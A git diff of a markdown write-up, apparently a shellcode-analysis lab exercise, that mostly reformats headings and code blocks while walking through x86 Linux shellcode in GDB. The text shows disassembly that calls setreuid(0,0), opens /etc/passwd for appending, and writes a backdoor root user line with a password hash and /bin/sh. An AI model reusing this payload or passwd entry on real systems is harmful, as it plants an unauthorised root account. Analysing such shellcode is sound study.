@@ -14,25 +14,27 @@ output of ndisasm, created with this command:
 
 To analyze the shellcode itself I decided to use GDB with the [pwndbg plugin](https://github.com/pwndbg/pwndbg). 
 
-First I needed to skip my runner code and get to the actual shellcode. The commands needed are:
+**First I needed to skip my runner code and get to the actual shellcode. The commands needed are:**
 ```
 b*main+201
 r
 stepi
 ```
 
-The first thing the shellcode does is set the real and effective user id of the process to 0 (root)
----
+**The first thing the shellcode does is set the real and effective user id of the process to 0 (root)**
+
 `setreuid(0, 0);`
 
+```
 00000000  31C9              xor ecx,ecx				; ECX = 0
 00000002  89CB              mov ebx,ecx				; EBX = 0
 00000004  6A46              push byte +0x46
 00000006  58                pop eax					; EAX = 0x46
 00000007  CD80              int 0x80				; setreuid(...)
+```
 
-Next open "/etc/passwd", which is the file where users are defined on linux
----
+**Next open "/etc/passwd", which is the file where users are defined on linux**
+
 `int fd = open("/etc/passwd", 0x401);`
 
 ```
@@ -49,8 +51,8 @@ Next open "/etc/passwd", which is the file where users are defined on linux
 00000023  CD80              int 0x80				; open(...)
 ```
 
-Assembly code from here on was incorrectly disassembled by ndisasm. I will include it anyways, but What actually happens is:
----
+**Assembly code from here on was incorrectly disassembled by ndisasm. I will include it anyways, but What actually happens is:**
+
 `buf` is a predefined series of characters with the value
 `"user:Azw17cTnnJAAA:0:0::/:/bin/sh\n"`
 
